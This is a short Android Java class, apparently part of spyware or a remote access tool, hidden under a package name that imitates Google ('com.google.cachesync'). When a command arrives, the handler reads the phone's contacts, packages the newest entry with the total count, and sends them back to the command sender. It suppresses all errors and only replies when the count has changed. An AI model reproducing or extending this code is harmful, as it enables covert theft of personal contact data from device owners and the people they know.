package com.google.cachesync;

import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract.Contacts;


public class handleContacts extends Handler {
	
	private Context mContext;
	long lastCount;
	
	public handleContacts(Context context) {
		mContext = context;
		lastCount = -1;
	}
	
	public void handleMessage(Message msg) {
		CommandObj cmd = (CommandObj) msg.obj;
        Cursor cur = mContext.getContentResolver().query(Contacts.CONTENT_URI, null,null, null, "_id DESC");
        int count = cur.getCount();
        if  (cur == null || !cur.moveToFirst() )
        	return;
        ContactObj con = new ContactObj(cur,mContext);
        if ( lastCount  == count ) 
        	return;
        lastCount = count;
        try {
			cmd.Reply(con,Integer.valueOf(count));
		} catch (Exception e) {
		}
	}
}
